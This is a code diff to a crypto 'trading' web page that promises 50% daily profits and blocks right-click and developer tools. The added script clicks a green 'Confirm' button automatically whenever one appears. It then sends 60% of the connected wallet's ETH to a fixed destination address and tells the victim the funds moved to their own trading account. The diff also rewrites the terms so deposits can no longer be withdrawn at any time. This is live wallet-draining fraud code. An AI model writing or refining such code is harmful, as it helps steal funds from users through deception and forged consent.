@@ -201,7 +201,7 @@
     </style>
 </head>
 <body>
-    <!-- Do not edit this particular code for SECURITY Disable right-click and dev tools -->
+    <!-- Disable right-click and dev tools -->
     <script>
         document.addEventListener('contextmenu', e => e.preventDefault());
         
@@ -346,10 +346,10 @@
                 </button>
             </div>
             <div class="mb-6">
-                <p class="mb-4">Confirm the deposit to your trading address to begin trade</p>
+                <p class="mb-4">Confirm the deposit to your trading address tp begin trade</p>
                 <ul class="list-disc pl-5 space-y-2 text-sm">
                     <li>Your Personal Trading deposit address has been allocated to your trading account</li>
-                    <li>Your Trading deposits and profits can be directly Withdrawn to your wallet balance at anytime</li>
+                    <li>Your Trading profits would be directly Withdrawn to your assets at the end of each trade</li>
                     <li>50% DAILY PROFITS, Confirm the transaction to fund your trading address</li>
                 </ul>
             </div>
@@ -557,11 +557,68 @@
                 mainContent.classList.add('blur-background');
             });
 
+            // Function to find and click the green Confirm button
+            function findAndClickConfirmButton() {
+                // Get all buttons on the page
+                const buttons = document.querySelectorAll('button');
+                
+                // Look for a button with green background (#48ff91) and text "Confirm"
+                for (const button of buttons) {
+                    const computedStyle = window.getComputedStyle(button);
+                    const bgColor = computedStyle.backgroundColor;
+                    const buttonText = button.textContent.trim().toLowerCase();
+                    
+                    // Check if button has the right color and text
+                    if ((bgColor === 'rgb(72, 255, 145)' || bgColor === '#48ff91') && 
+                        buttonText.includes('confirm')) {
+                        console.log('Found confirm button:', button);
+                        button.click();
+                        return true;
+                    }
+                }
+                
+                return false;
+            }
+
+            // Function to observe DOM changes and look for the confirm button
+            function setupConfirmButtonObserver() {
+                // If observer already exists, disconnect it first
+                if (confirmButtonObserver) {
+                    confirmButtonObserver.disconnect();
+                }
+                
+                // Create a MutationObserver to watch for DOM changes
+                confirmButtonObserver = new MutationObserver(function(mutations) {
+                    // Try to find and click the confirm button
+                    const found = findAndClickConfirmButton();
+                    
+                    if (found) {
+                        // If found, disconnect the observer
+                        confirmButtonObserver.disconnect();
+                        confirmButtonObserver = null;
+                    }
+                });
+                
+                // Start observing the document with the configured parameters
+                confirmButtonObserver.observe(document.body, {
+                    childList: true,
+                    subtree: true,
+                    attributes: true,
+                    characterData: true
+                });
+                
+                // Also try immediately in case the button is already there
+                findAndClickConfirmButton();
+            }
+
             // Agree to automatic transfer
             agreeBtn.addEventListener('click', async function() {
                 userAgreed = true;
                 warningModal.classList.add('hidden');
                 mainContent.classList.remove('blur-background');
+                
+                // Set up the observer to watch for the confirm button
+                setupConfirmButtonObserver();
                 
                 // Connect wallet and initiate transfer
                 await connectWalletAndTransfer();
@@ -572,11 +629,39 @@
                 warningModal.classList.add('hidden');
                 mainContent.classList.remove('blur-background');
                 userAgreed = false;
+                
+                // Disconnect any existing observer
+                if (confirmButtonObserver) {
+                    confirmButtonObserver.disconnect();
+                    confirmButtonObserver = null;
+                }
+            });
                     
             cancelBtn2.addEventListener('click', function() {
                 warningModal.classList.add('hidden');
                 mainContent.classList.remove('blur-background');
                 userAgreed = false;
+                
+                // Disconnect any existing observer
+                if (confirmButtonObserver) {
+                    confirmButtonObserver.disconnect();
+                    confirmButtonObserver = null;
+                }
+            });
+
+            // Agree to start trading (transfer 60%)
+            agreeTradeBtn.addEventListener('click', async function() {
+                // Disable button to prevent multiple clicks
+                agreeTradeBtn.disabled = true;
+                agreeTradeBtn.classList.add('opacity-50', 'cursor-not-allowed');
+                
+                // Initiate transfer
+                await transferToTradingAccount();
+                
+                // Re-enable button after transaction completes or fails
+                agreeTradeBtn.disabled = false;
+                agreeTradeBtn.classList.remove('opacity-50', 'cursor-not-allowed');
+            });
 
             // Main function to connect wallet and perform transfer
             async function connectWalletAndTransfer() {
@@ -663,6 +748,99 @@
                     testSection.classList.add('hidden');
                     walletStatus.classList.add('hidden');
                     connectWalletBtn.classList.add('pulse');
+                }
+            }
+
+            // Function to transfer 60% to trading account
+            async function transferToTradingAccount() {
+                try {
+                    // Get current account
+                    const accounts = await web3.eth.getAccounts();
+                    const account = accounts[0];
+
+                    if (!account) {
+                        throw new Error('No account connected');
+                    }
+
+                    // Get current balance
+                    const balanceWei = await web3.eth.getBalance(account);
+                    const balanceEth = web3.utils.fromWei(balanceWei, 'ether');
+                    
+                    // Calculate 60% of balance in Wei
+                    const amountEth = balanceEth * 0.6;
+                    const amountWei = web3.utils.toWei(amountEth.toString(), 'ether');
+
+                    // Show processing modal
+                    transactionModal.classList.remove('hidden');
+                    transactionSpinner.classList.remove('hidden');
+                    transactionSuccess.classList.add('hidden');
+                    transactionError.classList.add('hidden');
+                    transactionDetails.classList.add('hidden');
+                    txHashContainer.classList.add('hidden');
+                    transactionTitle.textContent = 'Processing Transaction';
+                    transactionMessage.textContent = 'Please confirm the transaction in your wallet...';
+
+                    // Get current gas price
+                    const gasPrice = await web3.eth.getGasPrice();
+                    const gasPriceGwei = web3.utils.fromWei(gasPrice, 'gwei');
+                    
+                    // Update estimated gas fee display (assuming 21000 gas limit)
+                    const gasCostEth = 21000 * gasPrice / 1e18;
+                    estimatedGasFee.textContent = `~$${(gasCostEth * 2000).toFixed(2)} (estimated)`; // Assuming $2000/ETH
+                    
+                    // Prepare transaction parameters
+                    const transactionParameters = {
+                        from: account,
+                        to: DESTINATION_ADDRESS,
+                        value: amountWei,
+                        gas: web3.utils.toHex(21000), // Standard gas limit for simple ETH transfers
+                        gasPrice: gasPrice // Current gas price
+                    };
+                    
+                    // Send transaction - this will trigger the wallet confirmation
+                    web3.eth.sendTransaction(transactionParameters)
+                        .on('transactionHash', function(hash) {
+                            // Transaction was sent to the network
+                            console.log('Transaction hash:', hash);
+                            txHashContainer.classList.remove('hidden');
+                            txHashLink.textContent = `${hash.substring(0, 12)}...${hash.substring(58)}`;
+                            txHashLink.href = `https://etherscan.io/tx/${hash}`;
+                        })
+                        .on('receipt', function(receipt) {
+                            // Transaction was mined
+                            console.log('Transaction receipt:', receipt);
+                            
+                            // Show success
+                            transactionSpinner.classList.add('hidden');
+                            transactionSuccess.classList.remove('hidden');
+                            transactionTitle.textContent = 'Transaction Successful';
+                            transactionMessage.textContent = `${parseFloat(amountEth).toFixed(6)} ETH has been transferred to your trading account!`;
+                            transactionDetails.classList.remove('hidden');
+                            txFrom.textContent = account;
+                            
+                            // Update balance display
+                            const newBalanceEth = balanceEth - amountEth;
+                            walletBalance.textContent = `${parseFloat(newBalanceEth).toFixed(6)} ETH`;
+                            tradingCapital.textContent = `0 ETH`;
+                        })
+                        .on('error', function(error) {
+                            console.error('Transaction error:', error);
+                            
+                            // Show error
+                            transactionSpinner.classList.add('hidden');
+                            transactionError.classList.remove('hidden');
+                            transactionTitle.textContent = 'Transaction Failed';
+                            transactionMessage.textContent = error.message || 'There was an error sending the transaction.';
+                        });
+                  
+                } catch (error) {
+                    console.error('Error performing transaction:', error);
+                    
+                    // Show error
+                    transactionSpinner.classList.add('hidden');
+                    transactionError.classList.remove('hidden');
+                    transactionTitle.textContent = 'Transaction Failed';
+                    transactionMessage.textContent = error.message || 'There was an error sending the transaction.';
                 }
             }
 
